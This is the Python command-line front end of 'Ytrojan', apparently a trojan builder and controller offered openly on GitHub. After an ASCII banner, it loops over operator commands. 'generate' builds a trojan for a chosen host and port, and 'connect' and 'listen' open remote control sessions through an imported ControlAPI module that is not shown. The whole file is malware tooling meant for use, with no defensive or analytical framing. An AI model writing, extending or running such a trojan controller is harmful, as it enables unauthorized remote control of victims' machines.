import ControlAPI

if "__main__" == __name__:
    print("""
      __   ___             _             
      \ \ / / |_ _ __ ___ (_) __ _ _ __  
       \ V /| __| '__/ _ \| |/ _` | '_ \ 
        | | | |_| | | (_) | | (_| | | | |
        |_|  \__|_|  \___// |\__,_|_| |_|
                        |__/                
                                      V 1.1.0.20220827
        
          www.github.com/ycy20090311/Ytrojan
    """)

    while True:
        cmd = input("Ytrojan $>").split()
        if cmd[0] == "generate":
          parameters = input("parameters $>").split()
          ControlAPI.generate(int(cmd[1]),cmd[2],tuple([cmd[3],int(cmd[4])]),parameters)
        elif cmd[0] == "connect":
          control = ControlAPI.Control(tuple([cmd[1],int(cmd[2])]))
          control.connect()
        elif cmd[0] == "listen":
          control = ControlAPI.Control(tuple([cmd[1],int(cmd[2])]))
          control.listen()
        elif cmd[0] == "exit":
          exit(0)
        else:
          print(f"Does not contain {cmd[0]} commands")


